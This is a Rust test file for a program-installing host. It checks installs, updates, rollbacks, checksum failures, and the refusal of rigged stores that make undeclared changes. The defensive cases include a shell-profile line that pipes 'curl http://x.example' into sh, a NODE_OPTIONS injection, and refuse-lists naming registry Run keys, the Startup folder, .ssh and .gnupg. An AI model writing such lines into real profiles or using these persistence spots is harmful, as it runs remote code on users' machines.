//! The host running a store: an install writes `current.json` and a launch that runs, an update switches and keeps the
//! previous copy, a failure leaves the current copy alone, and a change the plan did not declare is refused and undone.
#![allow(
    clippy::std_instead_of_core,
    clippy::std_instead_of_alloc,
    reason = "a test names what it uses from std"
)]

use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::sync::atomic::AtomicBool;

use canoa::store::{
    Action, ApplyOutcome, ApplyRequest, InstallPlan, InstallPrompter, InstallTools, LatestQuery,
    LatestReport, PlanRequest, ProgramQuery, ProgramReport, ProgramStore, StoreInfo, StoreSettings,
};
use canoa_host::store::builtin::{EchoArchiveStore, EchoStore};
use canoa_host::store::contract::{Fixture, Variant, WorldTransport};
use canoa_host::store::echo::{EchoFixture, EchoRecipe};
use canoa_host::store::engine::Engine;
use canoa_host::store::programs::{Options, Programs, Recorder, StoreError};
use canoa_host::store::shelf::Shelf;
use coqui_acp_api::ProcessSpawner;
use coqui_acp_api::guatiao::library::{Object, ProviderError, Registry};

coqui_acp_api::guatiao::local_providers!(
    id = "echo-stores",
    version = "0.0.0",
    providers = [EchoStore, EchoArchiveStore]
);

struct Dir(PathBuf);

impl Dir {
    fn new(name: &str) -> Self {
        let mut nonce = [0u8; 4];
        getrandom::fill(&mut nonce).expect("random");
        let hex: String = nonce.iter().map(|b| format!("{b:02x}")).collect();
        let path = std::env::temp_dir().join(format!("canoa-programs-{name}-{hex}"));
        fs::create_dir_all(&path).expect("a directory");
        Self(path)
    }
}

impl Drop for Dir {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.0);
    }
}

fn standin() -> PathBuf {
    let exe = std::env::current_exe().expect("test path");
    let dir = exe.parent().expect("deps").parent().expect("debug");
    let name = if cfg!(windows) {
        "version_standin.exe"
    } else {
        "version_standin"
    };
    let path = dir.join("examples").join(name);
    assert!(
        path.is_file(),
        "build the examples first: cargo build -p canoa-host --examples"
    );
    path
}

fn registry() -> Arc<Registry> {
    let mut registry = Registry::new("test", "0.0.0");
    registry
        .register_local("test", library)
        .expect("registered");
    Arc::new(registry)
}

struct Setup {
    dir: Dir,
    programs: Programs,
    transport: Arc<WorldTransport>,
    fixture: EchoFixture,
}

fn setup(name: &str, store_variant: Variant) -> Setup {
    let dir = Dir::new(name);
    let home = dir.0.join("home");
    fs::create_dir_all(&home).expect("home");
    let fixture = EchoFixture {
        standin: standin(),
        archive: false,
    };
    let transport = WorldTransport::new(fixture.world(store_variant));
    let mut options = Options::default();
    options.home = Some(home);
    options.watch_registry = false;
    options.settle = std::time::Duration::from_millis(100);
    // The tests run wherever a developer does, an elevated shell included: elevation is checked by its own test.
    options.allow_elevated = true;
    options.environment = {
        let mut env = coqui_acp_api::Environment::new();
        for name in ["PATH", "Path", "SystemRoot"] {
            if let Ok(value) = std::env::var(name) {
                env.insert(name, value);
            }
        }
        env
    };
    let programs = Programs::new(Shelf::unchecked(dir.0.join("programs")), registry())
        .transport(transport.clone())
        .options(options);
    Setup {
        dir,
        programs,
        transport,
        fixture,
    }
}

/// `Programs` over this setup's folders and world, with these options.
trait ForTests {
    fn unchecked_for_tests(s: &Setup, options: Options) -> Programs;
}

impl ForTests for Programs {
    fn unchecked_for_tests(s: &Setup, options: Options) -> Programs {
        Programs::new(Shelf::unchecked(s.dir.0.join("programs")), registry())
            .transport(s.transport.clone())
            .options(options)
    }
}

fn install(
    s: &Setup,
    version: Option<&str>,
    action: Action,
) -> Result<Option<canoa_host::store::programs::Applied>, StoreError> {
    let settings = StoreSettings::default();
    let store = s.programs.store("echo_store", &settings)?;
    let plan = s.programs.plan(
        "echo_store",
        &*store,
        action,
        None,
        version.map(str::to_owned),
    )?;
    s.programs.apply(
        "echo_store",
        &settings,
        &plan,
        Arc::new(Recorder::default()),
        Arc::new(AtomicBool::new(false)),
    )
}

fn current(s: &Setup) -> Option<canoa_host::store::shelf::Current> {
    s.programs
        .shelf()
        .program("echo")
        .expect("p")
        .current()
        .expect("read")
}

#[test]
fn an_install_writes_current_json_and_a_launch_that_runs() {
    let s = setup("install", Variant::Normal);
    let applied = install(&s, None, Action::Install)
        .expect("installed")
        .expect("applied");
    assert_eq!(applied.current.version, "2.0.0");
    let current = current(&s).expect("current.json");
    assert!(Path::new(&current.launch.path).is_file());
    assert!(Path::new(&current.dir).starts_with(s.dir.0.join("programs")));
    assert_eq!(
        current.files.len(),
        1,
        "one fetched file is on the audit trail"
    );
    assert!(
        current.files[0]
            .url
            .starts_with("https://echo.example.test/2.0.0/")
    );
    assert_eq!(current.files[0].sha256.len(), 64);
    // The program reports its version, with the launch the host recorded.
    let store = s
        .programs
        .store("echo_store", &StoreSettings::default())
        .expect("store");
    let report = s.programs.report(&*store, true, None).expect("report");
    assert_eq!(report.copies[0].version.as_deref(), Some("2.0.0"));
    assert!(report.copies[0].managed);
    assert_eq!(
        report.copies[0]
            .launch
            .environment
            .get("ECHO_NO_UPDATE")
            .map(String::as_str),
        Some("1")
    );
    // `executable` is what a harness provider takes.
    let settings = serde_json::to_value(guatiao_serde::Serializable::from(
        &report.copies[0].launch.settings,
    ))
    .expect("json");
    assert_eq!(
        settings["executable"].as_str(),
        Some(report.copies[0].path.as_str())
    );
}

#[test]
fn an_update_switches_and_keeps_the_previous_copy_where_a_running_session_started_from() {
    let s = setup("update", Variant::Normal);
    install(&s, Some("1.0.0"), Action::Install)
        .expect("first")
        .expect("applied");
    let old = current(&s).expect("first current");
    install(&s, None, Action::Update)
        .expect("update")
        .expect("applied");
    let new = current(&s).expect("second current");
    assert_eq!(new.version, "2.0.0");
    assert_eq!(new.previous.as_ref().expect("previous").version, "1.0.0");
    assert!(
        Path::new(&old.launch.path).is_file(),
        "a session that started on the old path keeps running it"
    );
    let again = install(&s, None, Action::Update).expect("a plan for the current version");
    assert!(
        again.is_none(),
        "an update to the current version changes nothing"
    );
    assert_eq!(current(&s).expect("same").dir, new.dir);
}

#[test]
fn a_rollback_returns_to_the_previous_version_without_asking_the_store() {
    let s = setup("rollback", Variant::Normal);
    install(&s, Some("1.0.0"), Action::Install).expect("first");
    install(&s, None, Action::Update).expect("second");
    let store = s
        .programs
        .store("echo_store", &StoreSettings::default())
        .expect("store");
    let back = s.programs.rollback(&*store).expect("rolled back");
    assert_eq!(back.version, "1.0.0");
    assert_eq!(current(&s).expect("current").version, "1.0.0");
}

#[test]
fn a_mismatched_download_leaves_the_current_copy_and_no_folder() {
    let s = setup("mismatch", Variant::Normal);
    install(&s, Some("1.0.0"), Action::Install).expect("first");
    let before = current(&s).expect("current");
    let store = s
        .programs
        .store("echo_store", &StoreSettings::default())
        .expect("store");
    let plan = s
        .programs
        .plan("echo_store", &*store, Action::Update, None, None)
        .expect("plan");
    s.transport.serve(s.fixture.world(Variant::Mismatch));
    let error = s
        .programs
        .apply(
            "echo_store",
            &StoreSettings::default(),
            &plan,
            Arc::new(Recorder::default()),
            Arc::new(AtomicBool::new(false)),
        )
        .expect_err("refused");
    assert!(format!("{error}").contains("checksum mismatch"), "{error}");
    assert_eq!(current(&s).expect("still").dir, before.dir);
    let versions: Vec<_> = fs::read_dir(s.dir.0.join("programs/echo/versions"))
        .expect("versions")
        .flatten()
        .collect();
    assert_eq!(versions.len(), 1, "the failed version's folder was removed");
}

#[test]
fn an_install_that_will_not_run_is_not_switched_to() {
    let s = setup("wontrun", Variant::WillNotRun);
    let error = install(&s, None, Action::Install).expect_err("refused");
    assert!(format!("{error}").contains("will not run"), "{error}");
    assert!(current(&s).is_none());
}

/// A store that appends to the real home's profile, which its plan did not declare.
struct Sneaky {
    engine: Engine<EchoRecipe>,
    rc: PathBuf,
}

impl ProgramStore for Sneaky {
    fn describe(&self) -> Result<StoreInfo, ProviderError> {
        self.engine.describe()
    }
    fn program(
        &self,
        q: ProgramQuery,
        s: Object<dyn ProcessSpawner>,
        t: Object<dyn InstallTools>,
    ) -> Result<ProgramReport, ProviderError> {
        self.engine.program(&q, &s, &t)
    }
    fn latest(
        &self,
        q: LatestQuery,
        t: Object<dyn InstallTools>,
    ) -> Result<LatestReport, ProviderError> {
        self.engine.latest(&q, &t)
    }
    fn plan(
        &self,
        r: PlanRequest,
        t: Object<dyn InstallTools>,
    ) -> Result<InstallPlan, ProviderError> {
        self.engine.plan(&r, &t)
    }
    fn apply(
        &self,
        r: ApplyRequest,
        s: Object<dyn ProcessSpawner>,
        t: Object<dyn InstallTools>,
        p: Object<dyn InstallPrompter>,
    ) -> Result<ApplyOutcome, ProviderError> {
        let mut file = fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&self.rc)
            .expect("rc");
        writeln!(file, "export PATH=$HOME/.echo/bin:$PATH").expect("write");
        self.engine.apply(&r, &s, &t, &p)
    }
}

#[test]
fn an_undeclared_change_is_refused_named_and_the_version_folder_removed() {
    let s = setup("undeclared", Variant::Normal);
    let store: Arc<dyn ProgramStore> = Arc::new(Sneaky {
        engine: Engine::new(EchoRecipe, StoreSettings::default()),
        rc: s.dir.0.join("home/.bashrc"),
    });
    let plan = s
        .programs
        .plan("echo_store", &*store, Action::Install, None, None)
        .expect("plan");
    let error = s
        .programs
        .apply_store(
            store,
            "echo_store",
            &plan,
            Arc::new(Recorder::default()),
            Arc::new(AtomicBool::new(false)),
        )
        .expect_err("refused");
    let StoreError::Undeclared { items, .. } = &error else {
        panic!("{error}")
    };
    assert!(
        items.iter().any(|i| i.what.ends_with(".bashrc")),
        "{items:?}"
    );
    assert!(current(&s).is_none(), "nothing was switched to");
    let versions = s.dir.0.join("programs/echo/versions");
    let left = fs::read_dir(&versions).map(|d| d.count()).unwrap_or(0);
    assert_eq!(left, 0, "the version folder was removed");
    assert!(
        format!("{error}").contains(".bashrc"),
        "the person is told exactly what changed"
    );
}

/// What a rigged store does around the echo engine's apply.
#[derive(Clone)]
enum Rig {
    /// Appends a PATH line to the profile and then fails, as an installer that gets half way does.
    WriteRcThenFail,
    /// Appends a PATH line to the profile and goes on.
    WritesRc,
    /// Something else keeps rewriting the profile, during the install and after it.
    MovingProfile,
    /// Something else keeps rewriting a file outside everything the host watches.
    MovingElsewhere(PathBuf),
    /// Declares a change covering the whole home, and does nothing else.
    DeclaresTheHome(PathBuf),
    /// Declares a change of the user's `PATH`, and writes a line that is not one.
    DeclaresPathWritesAlias,
    /// Changes a file in another program's folder under the programs root, as an install must not.
    TouchesAnotherProgram(PathBuf),
    /// Answers with a launch that sets a variable which changes what a program loads.
    LaunchesWithNodeOptions,
    /// Answers with a launch whose script is a file outside the version's folder.
    LaunchesAScriptElsewhere(PathBuf),
    /// Declares a change of this registry key.
    DeclaresRegistry(String),
    /// Declares this folder as the program's own state.
    DeclaresState(PathBuf),
    /// Declares adding `dir` to the user's `PATH`, and writes `line` to the profile.
    DeclaresPathLine { dir: PathBuf, line: String },
    /// Declares a change of the profile, makes it, and fails.
    WritesDeclaredThenFails,
    /// Returns at once, and a moment later something it started writes the profile.
    LingersThenWrites,
    /// Plans a download that nothing checks.
    PlansAnUnverifiedDownload,
}

struct Rigged {
    engine: Engine<EchoRecipe>,
    rc: PathBuf,
    rig: Rig,
}

impl ProgramStore for Rigged {
    fn describe(&self) -> Result<StoreInfo, ProviderError> {
        self.engine.describe()
    }
    fn program(
        &self,
        q: ProgramQuery,
        s: Object<dyn ProcessSpawner>,
        t: Object<dyn InstallTools>,
    ) -> Result<ProgramReport, ProviderError> {
        self.engine.program(&q, &s, &t)
    }
    fn latest(
        &self,
        q: LatestQuery,
        t: Object<dyn InstallTools>,
    ) -> Result<LatestReport, ProviderError> {
        self.engine.latest(&q, &t)
    }
    fn plan(
        &self,
        r: PlanRequest,
        t: Object<dyn InstallTools>,
    ) -> Result<InstallPlan, ProviderError> {
        let mut plan = self.engine.plan(&r, &t)?;
        match &self.rig {
            Rig::DeclaresTheHome(home) => plan.changes.push(canoa::store::Change::new(
                canoa::store::PATH,
                home.to_string_lossy(),
                "everything",
                false,
            )),
            Rig::DeclaresPathWritesAlias => plan.changes.push(canoa::store::Change::new(
                canoa::store::USER_PATH,
                self.rc
                    .parent()
                    .expect("home")
                    .join(".echo")
                    .join("bin")
                    .to_string_lossy(),
                "adds a directory",
                true,
            )),
            Rig::DeclaresRegistry(key) => plan.changes.push(canoa::store::Change::new(
                canoa::store::REGISTRY,
                key.clone(),
                "a key",
                false,
            )),
            Rig::DeclaresState(dir) => plan.changes.push(canoa::store::Change::new(
                canoa::store::STATE_DIR,
                dir.to_string_lossy(),
                "state",
                false,
            )),
            Rig::DeclaresPathLine { dir, .. } => plan.changes.push(canoa::store::Change::new(
                canoa::store::USER_PATH,
                dir.to_string_lossy(),
                "adds a directory",
                true,
            )),
            Rig::WritesDeclaredThenFails => plan.changes.push(canoa::store::Change::new(
                canoa::store::PROFILE_FILE,
                self.rc.to_string_lossy(),
                "adds a line",
                true,
            )),
            Rig::PlansAnUnverifiedDownload => {
                for download in &mut plan.downloads {
                    download.check = canoa::store::Check::Unverified {
                        why: "the test says so".to_owned(),
                    };
                }
            }
            _ => {}
        }
        Ok(plan)
    }
    fn apply(
        &self,
        r: ApplyRequest,
        s: Object<dyn ProcessSpawner>,
        t: Object<dyn InstallTools>,
        p: Object<dyn InstallPrompter>,
    ) -> Result<ApplyOutcome, ProviderError> {
        let rewrite = |path: PathBuf| {
            std::thread::spawn(move || {
                for n in 0..40 {
                    let _ = fs::write(&path, format!("# rewritten {n}\n"));
                    std::thread::sleep(std::time::Duration::from_millis(60));
                }
            });
        };
        match &self.rig {
            Rig::WriteRcThenFail => {
                let mut file = fs::OpenOptions::new()
                    .create(true)
                    .append(true)
                    .open(&self.rc)
                    .expect("rc");
                writeln!(file, "export PATH=$HOME/.echo/bin:$PATH").expect("write");
                return Err(ProviderError::new(
                    coqui_acp_api::guatiao::Status::GUATIAO_ERR_INTERNAL,
                    "boom",
                ));
            }
            Rig::WritesRc => {
                let mut file = fs::OpenOptions::new()
                    .create(true)
                    .append(true)
                    .open(&self.rc)
                    .expect("rc");
                writeln!(file, "export PATH=$HOME/.echo/bin:$PATH").expect("write");
            }
            Rig::MovingProfile => rewrite(self.rc.clone()),
            Rig::MovingElsewhere(path) => rewrite(path.clone()),
            Rig::DeclaresPathWritesAlias => {
                let mut file = fs::OpenOptions::new()
                    .create(true)
                    .append(true)
                    .open(&self.rc)
                    .expect("rc");
                writeln!(file, "alias ll='ls -l'").expect("write");
            }
            Rig::TouchesAnotherProgram(path) => {
                fs::write(path, b"changed by this install").expect("another program's file");
            }
            Rig::DeclaresTheHome(_)
            | Rig::DeclaresRegistry(_)
            | Rig::DeclaresState(_)
            | Rig::PlansAnUnverifiedDownload => {}
            Rig::DeclaresPathLine { line, .. } => {
                let mut file = fs::OpenOptions::new()
                    .create(true)
                    .append(true)
                    .open(&self.rc)
                    .expect("rc");
                writeln!(file, "{line}").expect("write");
            }
            Rig::WritesDeclaredThenFails => {
                let mut file = fs::OpenOptions::new()
                    .create(true)
                    .append(true)
                    .open(&self.rc)
                    .expect("rc");
                writeln!(file, "export PATH=$HOME/.echo/bin:$PATH").expect("write");
                return Err(ProviderError::new(
                    coqui_acp_api::guatiao::Status::GUATIAO_ERR_INTERNAL,
                    "boom",
                ));
            }
            Rig::LingersThenWrites => {}
            Rig::LaunchesWithNodeOptions | Rig::LaunchesAScriptElsewhere(_) => {
                let mut outcome = self.engine.apply(&r, &s, &t, &p)?;
                if let Some(launch) = outcome.launch.as_mut() {
                    match &self.rig {
                        Rig::LaunchesWithNodeOptions => {
                            launch
                                .environment
                                .insert("NODE_OPTIONS".to_owned(), "--require x".to_owned());
                        }
                        Rig::LaunchesAScriptElsewhere(path) => {
                            let mut settings = coqui_acp_api::guatiao::Map::new();
                            settings.set(
                                "script",
                                coqui_acp_api::guatiao::Value::from(
                                    path.to_string_lossy().as_ref(),
                                ),
                            );
                            launch.settings = coqui_acp_api::guatiao::Value::from(settings);
                        }
                        _ => {}
                    }
                }
                return Ok(outcome);
            }
        }
        let outcome = self.engine.apply(&r, &s, &t, &p);
        if matches!(self.rig, Rig::LingersThenWrites) {
            // Something the install started outlives it, and writes a moment after the apply has returned.
            let rc = self.rc.clone();
            std::thread::spawn(move || {
                std::thread::sleep(std::time::Duration::from_millis(500));
                if let Ok(mut file) = fs::OpenOptions::new().append(true).open(&rc) {
                    let _ = writeln!(file, "export PATH=$HOME/.late/bin:$PATH");
                }
            });
        }
        outcome
    }
}

/// The profile the rigged stores write to: one the person already has, at the path the footprint names it by.
fn profile(s: &Setup) -> PathBuf {
    s.dir.0.join("home").join(".bashrc")
}

fn rigged(s: &Setup, rig: Rig) -> Arc<dyn ProgramStore> {
    fs::write(
        profile(s),
        "# mine
",
    )
    .expect("a profile");
    Arc::new(Rigged {
        engine: Engine::new(EchoRecipe, StoreSettings::default()),
        rc: profile(s),
        rig,
    })
}

fn apply_rigged(
    s: &Setup,
    store: Arc<dyn ProgramStore>,
    edit: impl FnOnce(&mut InstallPlan),
) -> Result<Option<canoa_host::store::programs::Applied>, StoreError> {
    let mut plan = s
        .programs
        .plan("echo_store", &*store, Action::Install, None, None)
        .expect("plan");
    edit(&mut plan);
    s.programs.apply_store(
        store,
        "echo_store",
        &plan,
        Arc::new(Recorder::default()),
        Arc::new(AtomicBool::new(false)),
    )
}

#[test]
fn a_store_that_changes_the_profile_and_then_fails_is_reported_for_what_it_changed() {
    let s = setup("failing", Variant::Normal);
    let error = apply_rigged(&s, rigged(&s, Rig::WriteRcThenFail), |_| {}).expect_err("refused");
    let StoreError::Undeclared { items, .. } = &error else {
        panic!("a failed apply that changed the profile was reported as: {error}")
    };
    assert!(
        items.iter().any(|i| i.what.ends_with(".bashrc")),
        "{items:?}"
    );
    assert!(current(&s).is_none());
}

#[test]
fn a_profile_line_that_keeps_changing_is_caught_and_not_exempted() {
    let s = setup("moving", Variant::Normal);
    let error = apply_rigged(&s, rigged(&s, Rig::MovingProfile), |_| {}).expect_err("refused");
    assert!(matches!(error, StoreError::Undeclared { .. }), "{error}");
    assert!(
        format!("{error}").contains("try again"),
        "the person is told to retry: {error}"
    );
}

#[test]
fn a_path_outside_everything_watched_is_ignored_however_it_changes() {
    let s = setup("elsewhere", Variant::Normal);
    let noise = s.dir.0.join("unwatched");
    fs::create_dir_all(&noise).expect("dir");
    let rig = Rig::MovingElsewhere(noise.join("noise.txt"));
    let applied = apply_rigged(&s, rigged(&s, rig), |_| {}).expect("installed");
    assert!(applied.is_some());
}

#[test]
fn a_clients_copy_of_the_plan_cannot_declare_what_the_store_did_not() {
    let s = setup("clientplan", Variant::Normal);
    let rc = profile(&s);
    let error = apply_rigged(&s, rigged(&s, Rig::WritesRc), |plan| {
        plan.changes.push(canoa::store::Change::new(
            canoa::store::PROFILE_FILE,
            rc.to_string_lossy(),
            "adds a line",
            true,
        ));
    })
    .expect_err("refused");
    assert!(matches!(error, StoreError::Undeclared { .. }), "{error}");
}

#[test]
fn a_declared_change_that_covers_the_whole_home_is_refused() {
    let s = setup("declareshome", Variant::Normal);
    let home = s.dir.0.join("home");
    let error =
        apply_rigged(&s, rigged(&s, Rig::DeclaresTheHome(home)), |_| {}).expect_err("refused");
    assert!(format!("{error}").contains("declares"), "{error}");
}

#[test]
fn a_user_path_change_covers_a_path_line_and_not_an_alias() {
    let s = setup("pathalias", Variant::Normal);
    let error =
        apply_rigged(&s, rigged(&s, Rig::DeclaresPathWritesAlias), |_| {}).expect_err("refused");
    assert!(matches!(error, StoreError::Undeclared { .. }), "{error}");
}

#[test]
fn an_elevated_host_installs_only_when_told_it_may() {
    let s = setup("elevated", Variant::Normal);
    let mut options = Options::default();
    options.home = Some(s.dir.0.join("home"));
    options.watch_registry = false;
    options.settle = std::time::Duration::from_millis(100);
    options.allow_elevated = false;
    let programs = Programs::new(Shelf::unchecked(s.dir.0.join("strict")), registry())
        .transport(s.transport.clone())
        .options(options);
    let settings = StoreSettings::default();
    let store = programs.store("echo_store", &settings).expect("store");
    let plan = programs
        .plan("echo_store", &*store, Action::Install, None, None)
        .expect("plan");
    let result = programs.apply(
        "echo_store",
        &settings,
        &plan,
        Arc::new(Recorder::default()),
        Arc::new(AtomicBool::new(false)),
    );
    // Refused exactly when this process is elevated (root, or an administrator's token).
    let elevated = std::process::Command::new(if cfg!(windows) { "net.exe" } else { "id" })
        .args(if cfg!(windows) {
            vec!["session"]
        } else {
            vec!["-u"]
        })
        .output()
        .map(|o| {
            if cfg!(windows) {
                o.status.success()
            } else {
                String::from_utf8_lossy(&o.stdout).trim() == "0"
            }
        })
        .unwrap_or(false);
    assert_eq!(
        matches!(result, Err(StoreError::Elevated)),
        elevated,
        "{result:?}"
    );
}

#[test]
fn another_programs_folder_changing_during_an_install_is_caught() {
    let s = setup("otherprogram", Variant::Normal);
    let other = s.dir.0.join("programs").join("grok");
    fs::create_dir_all(&other).expect("another program's folder");
    let file = other.join("current.json");
    fs::write(&file, b"{}").expect("file");
    let error = apply_rigged(&s, rigged(&s, Rig::TouchesAnotherProgram(file)), |_| {})
        .expect_err("refused");
    let StoreError::Undeclared { items, .. } = &error else {
        panic!("{error}")
    };
    assert!(
        items.iter().any(|i| i.what.ends_with("current.json")),
        "{items:?}"
    );
}

#[test]
fn a_launch_that_sets_what_programs_load_or_names_a_script_elsewhere_is_refused() {
    let s = setup("launchshape", Variant::Normal);
    let error =
        apply_rigged(&s, rigged(&s, Rig::LaunchesWithNodeOptions), |_| {}).expect_err("refused");
    assert!(format!("{error}").contains("NODE_OPTIONS"), "{error}");
    let elsewhere = s.dir.0.join("elsewhere.js");
    let error = apply_rigged(
        &s,
        rigged(&s, Rig::LaunchesAScriptElsewhere(elsewhere)),
        |_| {},
    )
    .expect_err("refused");
    assert!(
        format!("{error}").contains("outside the version"),
        "{error}"
    );
    assert!(current(&s).is_none());
}

#[test]
fn a_declared_change_of_a_filesystem_root_is_refused() {
    let s = setup("rootchange", Variant::Normal);
    let root = std::env::temp_dir()
        .ancestors()
        .last()
        .expect("a root")
        .to_path_buf();
    let error =
        apply_rigged(&s, rigged(&s, Rig::DeclaresTheHome(root)), |_| {}).expect_err("refused");
    assert!(format!("{error}").contains("declares"), "{error}");
}

#[test]
fn a_download_nothing_checks_needs_the_host_to_have_been_told_and_is_then_recorded() {
    let s = setup("unverified", Variant::Normal);
    let error =
        apply_rigged(&s, rigged(&s, Rig::PlansAnUnverifiedDownload), |_| {}).expect_err("refused");
    assert!(matches!(error, StoreError::Unverified(_)), "{error}");
    // Told it may, the same plan goes ahead and the copy records that the file was not verified.
    let dir = Dir::new("unverified-ok");
    let home = dir.0.join("home");
    fs::create_dir_all(&home).expect("home");
    let mut options = Options::default();
    options.home = Some(home);
    options.watch_registry = false;
    options.settle = std::time::Duration::from_millis(100);
    options.allow_elevated = true;
    options.allow_unverified = true;
    let programs = Programs::new(Shelf::unchecked(dir.0.join("programs")), registry())
        .transport(s.transport.clone())
        .options(options);
    let store: Arc<dyn ProgramStore> = Arc::new(Rigged {
        engine: Engine::new(EchoRecipe, StoreSettings::default()),
        rc: dir.0.join("home").join(".bashrc"),
        rig: Rig::PlansAnUnverifiedDownload,
    });
    let plan = programs
        .plan("echo_store", &*store, Action::Install, None, None)
        .expect("plan");
    let applied = programs
        .apply_store(
            store,
            "echo_store",
            &plan,
            Arc::new(Recorder::default()),
            Arc::new(AtomicBool::new(false)),
        )
        .expect("allowed")
        .expect("applied");
    assert!(
        applied.current.files.iter().all(|f| !f.verified),
        "{:?}",
        applied.current.files
    );
}

#[test]
fn a_plan_the_host_did_not_make_is_not_applied() {
    let s = setup("foreignplan", Variant::Normal);
    let store = s
        .programs
        .store("echo_store", &StoreSettings::default())
        .expect("store");
    let mut plan = s
        .programs
        .plan("echo_store", &*store, Action::Install, None, None)
        .expect("plan");
    plan.token = "0".repeat(64);
    let error = s
        .programs
        .apply(
            "echo_store",
            &StoreSettings::default(),
            &plan,
            Arc::new(Recorder::default()),
            Arc::new(AtomicBool::new(false)),
        )
        .expect_err("refused");
    assert!(format!("{error}").contains("no such plan"), "{error}");
}

#[test]
fn a_downgrade_is_planned_and_shown_as_one() {
    let s = setup("downgrade", Variant::Normal);
    install(&s, None, Action::Install)
        .expect("2.0.0")
        .expect("applied");
    let store = s
        .programs
        .store("echo_store", &StoreSettings::default())
        .expect("store");
    let plan = s
        .programs
        .plan(
            "echo_store",
            &*store,
            Action::Update,
            None,
            Some("1.0.0".to_owned()),
        )
        .expect("plan");
    assert_eq!(plan.from_version.as_deref(), Some("2.0.0"));
    assert_eq!(plan.version.as_deref(), Some("1.0.0"));
    assert!(
        plan.notices.iter().any(|n| n.contains("downgrade")),
        "{:?}",
        plan.notices
    );
}

#[test]
fn a_recorded_file_that_was_changed_stops_the_launch_the_host_hands_out() {
    let s = setup("launchverify", Variant::Normal);
    install(&s, None, Action::Install)
        .expect("installed")
        .expect("applied");
    let store = s
        .programs
        .store("echo_store", &StoreSettings::default())
        .expect("store");
    let launch = s.programs.launch(&*store).expect("untouched");
    let path = launch.path.clone();
    let mut bytes = fs::read(&path).expect("the program");
    bytes.push(0);
    fs::write(&path, bytes).expect("tamper");
    assert!(s.programs.launch(&*store).is_err());
}

#[test]
fn only_the_copy_the_person_picked_is_run_among_those_outside_the_host() {
    let s = setup("pick", Variant::Normal);
    // A program named as the store looks for it, on a PATH directory, that would print a version if it were run.
    let bin = s.dir.0.join("bin");
    fs::create_dir_all(&bin).expect("bin");
    let name = if cfg!(windows) {
        "echo-program.exe"
    } else {
        "echo-program"
    };
    let tool = bin.join(name);
    fs::write(
        &tool,
        canoa_host::store::contract::standin_bytes(&standin(), "echo 9.9.9", 0, None),
    )
    .expect("tool");
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&tool, fs::Permissions::from_mode(0o755)).expect("chmod");
    }
    let mut options = Options::default();
    options.home = Some(s.dir.0.join("home"));
    options.watch_registry = false;
    options.settle = std::time::Duration::from_millis(100);
    options.allow_elevated = true;
    options.environment = {
        let mut env = coqui_acp_api::Environment::new();
        env.insert("PATH", bin.to_string_lossy().into_owned());
        if let Ok(root) = std::env::var("SystemRoot") {
            env.insert("SystemRoot", root);
        }
        env
    };
    let programs = Programs::new(Shelf::unchecked(s.dir.0.join("other-programs")), registry())
        .transport(s.transport.clone())
        .options(options);
    let store = programs
        .store("echo_store", &StoreSettings::default())
        .expect("store");
    let not_picked = programs.report(&*store, true, None).expect("report");
    assert_eq!(not_picked.copies.len(), 1);
    assert!(
        not_picked.copies[0].version.is_none(),
        "an outside copy was run: {:?}",
        not_picked.copies[0]
    );
    let path = not_picked.copies[0].path.clone();
    // A copy just written is scanned by the system on its first start, which can take longer than a probe is given: ask again.
    let version = (0..4)
        .find_map(|_| {
            programs
                .report(&*store, true, Some(&path))
                .expect("report")
                .copies[0]
                .version
                .clone()
        })
        .expect("the picked copy is run");
    assert_eq!(version, "9.9.9");
}

fn refuses_with_declares(s: &Setup, rig: Rig) {
    let error = apply_rigged(s, rigged(s, rig), |_| {}).expect_err("refused");
    assert!(format!("{error}").contains("declares"), "{error}");
}

#[test]
fn a_registry_target_is_normalised_and_only_a_programs_own_places_are_accepted() {
    let s = setup("registrytargets", Variant::Normal);
    for target in [
        "HKCU",
        "HKCU/",
        "HKCU\\.",
        "HKCU//",
        "hkey_current_user\\",
        "HKCU\\Software",
        "HKCU\\Software\\Microsoft",
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion",
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "HKCU\\Software\\Acme\\..\\..\\Microsoft",
    ] {
        refuses_with_declares(&s, Rig::DeclaresRegistry(target.to_owned()));
    }
    let ok = apply_rigged(
        &s,
        rigged(
            &s,
            Rig::DeclaresRegistry("HKCU\\Software\\Acme\\Echo".to_owned()),
        ),
        |_| {},
    );
    assert!(ok.is_ok(), "a key of the program's own: {ok:?}");
}

#[test]
fn a_state_folder_is_a_folder_named_for_the_program_and_never_a_place_the_system_reads() {
    let s = setup("statetargets", Variant::Normal);
    let home = s.dir.0.join("home");
    for relative in [
        "",
        ".config",
        ".ssh",
        ".gnupg",
        ".local/bin",
        ".local",
        "AppData",
        "AppData/Roaming",
        "AppData/Local",
        "Library",
        "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup",
        "Documents",
    ] {
        refuses_with_declares(&s, Rig::DeclaresState(home.join(relative)));
    }
    let ok = apply_rigged(
        &s,
        rigged(&s, Rig::DeclaresState(home.join(".echo"))),
        |_| {},
    );
    assert!(ok.is_ok(), "a folder named for the program: {ok:?}");
}

#[test]
fn a_user_path_change_covers_exactly_the_line_that_adds_the_declared_directory() {
    for (name, line) in [
        ("otherdir", "export PATH=$HOME/.other/bin:$PATH"),
        (
            "payload",
            "export PATH=$HOME/.echo/bin:$PATH; curl http://x.example | sh",
        ),
        ("substring", "alias path=\"$HOME/.echo/bin\""),
    ] {
        let s = setup(name, Variant::Normal);
        let dir = s.dir.0.join("home").join(".echo").join("bin");
        let rig = Rig::DeclaresPathLine {
            dir,
            line: line.to_owned(),
        };
        let error = apply_rigged(&s, rigged(&s, rig), |_| {}).expect_err(name);
        assert!(
            matches!(error, StoreError::Undeclared { .. }),
            "{name}: {error}"
        );
    }
    let s = setup("exactline", Variant::Normal);
    let dir = s.dir.0.join("home").join(".echo").join("bin");
    let rig = Rig::DeclaresPathLine {
        dir,
        line: "export PATH=$HOME/.echo/bin:$PATH".to_owned(),
    };
    let ok = apply_rigged(&s, rigged(&s, rig), |_| {});
    assert!(ok.is_ok(), "{ok:?}");
}

#[test]
fn an_uninstall_the_host_did_not_plan_is_refused_and_a_planned_one_removes_the_copy() {
    let s = setup("uninstall", Variant::Normal);
    install(&s, None, Action::Install)
        .expect("installed")
        .expect("applied");
